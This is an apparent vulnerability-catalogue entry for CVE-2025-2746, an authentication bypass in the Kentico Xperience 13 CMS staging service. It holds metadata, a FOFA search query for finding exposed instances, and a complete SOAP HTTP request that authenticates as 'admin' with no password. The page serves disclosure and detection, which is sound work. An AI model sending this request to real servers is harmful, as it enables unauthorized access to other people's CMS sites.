_cves/2025/cve-2025-2746.md

---
layout: "post"
cve_id: "CVE-2025-2746"
title: "Kentico Xperience 13 CMS - Staging Service Authentication Bypass (WT-2025-0011)"
pcap: true
pcap_path: "/pcaps/2025/CVE-2025-2746.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-2746.yaml"
author: "DhiyaneshDK"
severity: "critical"
reference:
  - "https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0011"
  - "https://devnet.kentico.com/download/hotfixes"
  - "https://labs.watchtowr.com/bypassing-authentication-like-its-the-90s-pre-auth-rce-chain-s-in-kentico-xperience-cms/"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2025-2746"
  cwe-id: "CWE-287"
  epss-score: 0.85899
  epss-percentile: 0.99343
metadata:
  verified: True
  max-request: 1
  fofa-query: "app=\"Kentico-CMS\""
tags:
  - "cve"
  - "cve2025"
  - "kentico"
  - "stag"
  - "auth-bypass"
  - "xperience13"
  - "vuln"
  - "kev"
  - "vkev"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ğŸ” Vulnerability Description
Before Kentico Xperience 13 Hotfix 173, this vulnerability can be exploited with any username provided. For Hotfix >= 173 and < 178, this vulnerability can be exploited only if you provide a valid Staging Service username (default: admin)


## ğŸŒ HTTP Request
```nohighlight
POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Content-Length: 952
Accept: */*
Content-Type: text/xml; charset=utf-8
SOAPAction: http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Header>
            <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
                <wsse:UsernameToken>
                    <wsse:Username>admin</wsse:Username>
                </wsse:UsernameToken>
            </wsse:Security>
        </soap:Header>
        <soap:Body>
            <ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
                <stagingTaskData><![CDATA[<axvjwdlbxiseyyovtmvtalynctqglyds>]]></stagingTaskData>
            </ProcessSynchronizationTaskData>
        </soap:Body>
    </soap:Envelope>
```


